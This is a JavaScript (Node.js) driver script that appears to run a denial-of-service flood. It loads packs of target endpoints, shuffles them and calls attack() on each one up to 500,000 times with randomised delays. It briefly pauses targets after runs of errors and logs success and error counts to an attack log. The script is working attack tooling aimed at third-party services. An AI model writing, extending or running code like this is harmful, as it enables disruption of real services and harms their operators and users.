require('dotenv').config();
const { Endpoint } = require("./endpoint");
const { sleep, sleepRand, randomInt, shuffle } = require("./helpers");
const pino = require('pino')
const targets = require(`./targets/pack${process.env.TARGET_PACK}.json`)

const transport = pino.transport({
  target: './log-transport.mjs',
  options: { destination: `./logs/`, filename: 'attack_.log' }
})
const logger = pino(transport)

const endpoints = targets.map((params) => new Endpoint(params, logger))
shuffle(endpoints)

const EXECUTION_LIMIT = 500000
const TIMEOUT_BASE = parseInt(process.env.TIMEOUT_BASE, 10)
const TIMEOUT_RANGE = parseInt(process.env.TIMEOUT_RANGE, 10)

const run = async () => {
  for (let i = 0; i < EXECUTION_LIMIT; i++) {
    await sleepRand(TIMEOUT_BASE, TIMEOUT_RANGE)
    endpoints.forEach(async endpoint => {
      if (endpoint.isActive && endpoint.stats.errorsInRow >= 500)
        endpoint.cooldown(randomInt(1 * 60, 5 * 60)) // cooldown for rand(1, 5) min
      
      endpoint.attack()
    })

    const stats = {
      s: 0,
      e: 0
    }
    endpoints.forEach(endpoint => { stats.s += endpoint.stats.s; stats.e += endpoint.stats.e })
    console.log(`Successfull ${stats.s} | Errors ${stats.e}`)
  }

  console.log('EXECUTION_LIMIT reached')
}

run().catch(e => { throw e })
